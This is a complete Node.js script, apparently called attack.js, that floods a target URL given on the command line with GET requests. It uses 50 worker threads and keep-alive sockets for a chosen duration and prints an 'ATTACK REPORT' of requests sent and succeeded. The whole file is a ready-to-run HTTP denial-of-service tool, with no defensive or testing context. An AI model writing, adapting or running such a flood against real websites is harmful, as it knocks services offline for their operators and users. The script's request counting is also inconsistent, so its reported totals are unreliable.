const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const http = require('http');
const https = require('https');

const THREADS = 50;
const TARGET = process.argv[2];
const DURATION = parseInt(process.argv[3]);

if (!TARGET || !DURATION) {
    console.log("Usage: node attack.js <target> <duration_in_seconds>");
    process.exit(1);
}

if (isMainThread) {
    let totalSent = 0;
    let totalSuccess = 0;

    for (let i = 0; i < THREADS; i++) {
        const worker = new Worker(__filename, {
            workerData: { TARGET, DURATION }
        });

        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                totalSent += msg.sent;
                totalSuccess += msg.success;
            }
        });
    }

    const statsInterval = setInterval(() => {
        console.clear();
        console.log("=== ATTACK REPORT ===");
        console.log("Total sent:", totalSent);
        console.log("Success:", totalSuccess);
    }, 1000);

    setTimeout(() => {
        clearInterval(statsInterval);
        console.log("\n=== FINAL REPORT ===");
        console.log("Total sent:", totalSent);
        console.log("Success:", totalSuccess);
        process.exit(0);
    }, DURATION * 1000);

} else {
    const { TARGET, DURATION } = workerData;
    const endTime = Date.now() + DURATION * 1000;
    const url = new URL(TARGET);
    const protocol = url.protocol === 'https:' ? https : http;

    const agent = new protocol.Agent({
        keepAlive: true,
        maxSockets: 10000
    });

    let sent = 0;
    let success = 0;

    function fire() {
        if (Date.now() >= endTime) {
            parentPort.postMessage({ type: 'stats', sent, success });
            return;
        }

        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname + url.search,
            method: 'GET',
            agent,
            headers: {
                Connection: 'keep-alive',
                Accept: '*/*',
            }
        };

        const req = protocol.request(options, res => {
            if (res.statusCode >= 200 && res.statusCode < 400) {
                success++;
            }
            res.resume();
        });

        req.on('error', () => {});
        req.end();
        sent++;

        if (sent % 1000 === 0) {
            parentPort.postMessage({ type: 'stats', sent: 1000, success });
            success = 0;
        }

        setImmediate(fire);
    }

    fire();
}
